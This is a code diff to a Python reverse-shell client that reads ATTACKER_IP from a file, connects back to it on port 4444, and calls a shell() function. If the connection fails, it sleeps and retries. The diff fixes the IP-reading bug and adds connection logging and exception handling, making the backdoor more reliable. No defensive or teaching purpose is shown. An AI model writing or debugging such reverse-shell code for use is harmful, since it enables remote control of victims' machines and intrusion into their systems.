@@ -1,6 +1,6 @@
 import socket, time, json, subprocess, os
 
-ATTACKER_IP = open("ip.txt").read().close()
+ATTACKER_IP = open("ip.txt").read().strip()
 
 def robust_send(data):
 	jsondata = json.dumps(data)
@@ -17,10 +17,13 @@ def robust_recv():
 
 def connect():
 		try:
+			print("Attempting connection...")
 			s.connect((ATTACKER_IP, 4444))
+			print("Connected")
 			shell()
 			s.close()
-		except:
+		except Exception as e:
+			print("Did not connect:", e)
 			time.sleep(20)
 			connect()
 
